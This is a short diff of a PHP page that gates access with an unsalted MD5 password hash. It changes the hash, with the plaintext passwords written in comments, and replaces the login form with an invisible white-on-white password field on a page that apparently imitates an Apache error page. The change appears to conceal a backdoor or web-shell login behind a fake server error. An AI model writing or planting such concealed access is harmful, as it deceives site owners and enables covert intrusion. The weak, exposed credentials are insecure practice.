@@ -1,7 +1,7 @@
 <?php
 session_start();
 
-$correctPasswordHash = '5f4dcc3b5aa765d61d8327deb882cf99'; // password
+$correctPasswordHash = 'b1fbd7e666a56c405c73b4b144d69156'; // sipur
 
 if (isset($_POST['password'])) {
     $enteredPassword = $_POST['password'];
@@ -64,9 +64,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
     </head>
     <body>
         <div class="password-form">
-            <form method="POST">
-                <input type="password" name="password" placeholder="" required>
-                <input type="submit" value="Login">
+        <form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>
             </form>
         </div>
     </body>
